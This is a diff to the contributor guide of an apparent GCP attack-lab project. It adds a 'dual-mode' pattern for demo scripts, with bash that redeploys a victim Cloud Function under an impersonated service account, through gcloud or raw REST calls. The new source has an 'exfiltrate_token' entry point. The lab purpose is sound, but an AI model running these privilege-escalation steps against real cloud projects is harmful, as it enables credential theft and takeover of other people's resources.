@@ -335,6 +335,102 @@ touch "$(dirname "$0")/.demo_active"
 
 **Path-depth note**: `modules/scenarios/gcp/single-account/privesc-one-hop/to-admin/{scenario}/` is 7 levels deep from the project root, one level deeper than the equivalent AWS path (`modules/scenarios/single-account/.../{scenario}/` at 6 levels) because of the extra `gcp/` segment. Adjust `cd ../../../../../../..` (7 levels) accordingly. GCP tool-testing/CTF categories will similarly be one level deeper than their AWS counterparts.
 
+## Dual-Mode Demo Pattern (gcloud + --api-only)
+
+Some GCP attack scenarios are most naturally expressed with the `gcloud` CLI — it shows the commands an attacker would actually type. However, `gcloud` makes extra preflight and polling calls beyond the raw API minimum, requiring permissions that are not strictly part of the attack's core permission surface.
+
+**When to use the dual-mode pattern**: apply it whenever the scenario's exploit step uses a `gcloud` subcommand (e.g., `gcloud functions deploy`, `gcloud run services update`) AND that command is known or suspected to make extra calls beyond the raw API (Cloud Build lookups, IAM policy reads, polling calls). Scenarios that only use `gcloud` for read-only observation steps (e.g., `gcloud iam service-accounts list`) do NOT need dual-mode — only the exploit step matters.
+
+### How to implement dual-mode
+
+**At the top of the script** (after color definitions, before Step 1):
+
+```bash
+# Parse --api-only flag
+USE_GCLOUD=true
+for arg in "$@"; do
+    case "$arg" in
+        --api-only) USE_GCLOUD=false ;;
+    esac
+done
+
+if $USE_GCLOUD; then
+    echo -e "${GREEN}Mode: gcloud (default)${NC}"
+    echo "  Uses gcloud CLI — clearest command sequence, but requires extra gcloud-mechanic permissions."
+    echo "  Run with --api-only for the minimal raw-API version."
+else
+    echo -e "${GREEN}Mode: raw API (--api-only)${NC}"
+    echo "  Uses the raw REST API — minimal permission surface, no gcloud-mechanic overhead."
+fi
+```
+
+**In the exploit step** (wherever gcloud is the natural tool), branch on `$USE_GCLOUD`:
+
+```bash
+if $USE_GCLOUD; then
+    # gcloud mode — the natural attacker command
+    show_attack_cmd "$STARTING_SA_EMAIL" \
+        "gcloud functions deploy $VICTIM_FUNCTION_NAME ... --impersonate-service-account=$STARTING_SA_EMAIL"
+    gcloud functions deploy "$VICTIM_FUNCTION_NAME" \
+        ... \
+        --impersonate-service-account="$STARTING_SA_EMAIL" \
+        --quiet 2>/dev/null || { echo -e "${RED}✗ gcloud deploy failed${NC}"; exit 1; }
+else
+    # Raw API mode — minimal permissions only
+    # Step A: generateUploadUrl
+    UPLOAD_INFO=$(curl -s -X POST \
+        "https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions/$VICTIM_FUNCTION_NAME:generateUploadUrl" \
+        -H "Authorization: Bearer $STARTING_TOKEN" \
+        -H "Content-Type: application/json" -d '{}')
+    UPLOAD_URL=$(echo "$UPLOAD_INFO" | jq -r '.uploadUrl')
+
+    # Step B: upload the zip to the signed URL
+    curl -s -X PUT "$UPLOAD_URL" \
+        -H "Content-Type: application/zip" \
+        --data-binary @"$BUILD_DIR/src.zip"
+
+    # Step C: PATCH the function's source
+    STORAGE_SOURCE=$(echo "$UPLOAD_INFO" | jq -c '{storageSource: {bucket: .storageSource.bucket, object: .storageSource.object}}')
+    PATCH_BODY=$(jq -n --argjson src "$STORAGE_SOURCE" \
+        '{buildConfig: {source: $src, entryPoint: "exfiltrate_token"}}')
+    curl -s -X PATCH \
+        "https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions/$VICTIM_FUNCTION_NAME?updateMask=buildConfig.source,buildConfig.entryPoint" \
+        -H "Authorization: Bearer $STARTING_TOKEN" \
+        -H "Content-Type: application/json" \
+        -d "$PATCH_BODY"
+fi
+```
+
+**At the end of gcloud-mode runs** (inside `if $USE_GCLOUD; then ... fi`, before "To clean up"):
+
+```bash
+if $USE_GCLOUD; then
+    echo -e "\n${YELLOW}Note on gcloud vs. raw API permissions:${NC}"
+    echo "  This demo used 'gcloud functions deploy', which is the natural tool for this"
+    echo "  attack and shows the clearest command sequence. However, gcloud makes extra"
+    echo "  preflight calls that require permissions beyond the attack's true minimum:"
+    echo ""
+    echo "    cloudbuild.builds.get           — gcloud queries Cloud Build's"
+    echo "                                      GetDefaultServiceAccount endpoint"
+    echo "    resourcemanager.projects.getIamPolicy — gcloud validates the project IAM policy"
+    echo "    run.services.getIamPolicy       — gcloud reads Cloud Run IAM post-deploy"
+    echo "    run.services.setIamPolicy       — gcloud sets Cloud Run IAM for"
+    echo "                                      --no-allow-unauthenticated"
+    echo ""
+    echo "  These are included in starting_sa's role by Terraform (labeled as gcloud mechanics)."
+    echo "  To see the attack with only the true minimum permissions, run:"
+    echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
+fi
+```
+
+**Important**: use `./demo_attack.sh --api-only` literally in the tip — never `$0`, which expands to the full absolute path when run via `plabs demo`.
+
+### How gcloud-mechanic permissions are documented
+
+Permissions that only exist because gcloud makes extra calls (not because the raw API requires them) go in `scenario.yaml` under `permissions.helpful`, with a `purpose` field that explicitly says "Required by gcloud ... only — not needed with the raw API". They are also included in the `main.tf` custom role with a comment block that distinguishes them from the core attack permissions.
+
+The end-of-demo note enumerates them so the reader understands the delta between `gcloud` mode and `--api-only` mode.
+
 ## Common GCP-Specific Patterns
 
 ### Self-Modification (project IAM policy binding)
